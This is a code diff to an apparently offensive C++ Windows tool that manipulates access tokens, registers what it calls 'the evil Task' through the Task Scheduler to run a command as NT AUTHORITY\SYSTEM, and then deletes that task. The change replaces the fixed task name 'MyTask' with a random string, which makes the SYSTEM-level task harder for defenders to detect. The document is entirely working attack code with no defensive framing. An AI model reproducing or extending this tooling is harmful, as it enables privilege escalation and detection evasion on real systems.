@@ -48,6 +48,7 @@ void PrintDacl(PACL dacl);
 void PrintSecurityContext(HANDLE token = NULL);
 void TokenAllTheThings(HANDLE hToken);
 void ManipulateTokenIntegrity(HANDLE hToken);
+std::string generateRandomString();
 
 // typedef's and struct
 typedef NTSTATUS(NTAPI* NtSetInformationToken_t)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG);
@@ -57,6 +58,16 @@ struct ThreadParams {
 	std::string arguments;
 	HANDLE token;
 };
+
+// function to generate a random string of 8 characters
+std::string generateRandomString() {
+	std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+	std::string randomString;
+	for (int i = 0; i < 8; ++i) {
+		randomString += characters[rand() % characters.size()];
+	}
+	return randomString;
+}
 
 // Lower a token's integrity level, necessary when impersonating from a medium IL with a high IL token.
 void ManipulateTokenIntegrity(HANDLE hToken) {
@@ -100,6 +111,7 @@ DWORD WINAPI TestPrivilegedOperations(LPVOID lpParam) {
 	std::string executable = tp->executable;
 	std::string arguments = tp->arguments;
 	HANDLE token = tp->token;
+	std::string myTask = generateRandomString();
 	// COM init
 	std::cout << "COM init..." << std::endl;
 	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
@@ -357,7 +369,7 @@ DWORD WINAPI TestPrivilegedOperations(LPVOID lpParam) {
 	}
 	std::cout << "Registering the evil Task.." << std::endl;
 	IRegisteredTask* pRegisteredTask = NULL;
-	hr = pRootFolder->RegisterTaskDefinition(_bstr_t(L"MyTask"), pTask, TASK_CREATE_OR_UPDATE, _variant_t(L"SYSTEM"), _variant_t(), TASK_LOGON_SERVICE_ACCOUNT, _variant_t(L""), &pRegisteredTask);
+	hr = pRootFolder->RegisterTaskDefinition(_bstr_t(myTask.c_str()), pTask, TASK_CREATE_OR_UPDATE, _variant_t(L"SYSTEM"), _variant_t(), TASK_LOGON_SERVICE_ACCOUNT, _variant_t(L""), &pRegisteredTask);
 	if (FAILED(hr)) {
 		std::cout << "ITaskFolder::RegisterTaskDefinition failed. Error: " << hr << std::endl;
 		pTask->Release();
@@ -384,9 +396,9 @@ DWORD WINAPI TestPrivilegedOperations(LPVOID lpParam) {
 	}
 	std::cout << "Executed command as NT AUTHORITY\\SYSTEM... wait for cleanup" << std::endl;
 	Sleep(3000); // Wait for 3 seconds.
-	hr = pRootFolder->GetTask(_bstr_t(L"MyTask"), &pRegisteredTask);
+	hr = pRootFolder->GetTask(_bstr_t(myTask.c_str()), &pRegisteredTask);
 	if (SUCCEEDED(hr)) {
-		hr = pRootFolder->DeleteTask(_bstr_t(L"MyTask"), 0);
+		hr = pRootFolder->DeleteTask(_bstr_t(myTask.c_str()), 0);
 		if (FAILED(hr)) {
 			std::cout << "ITaskFolder::DeleteTask failed. Error: " << hr << std::endl;
 		}
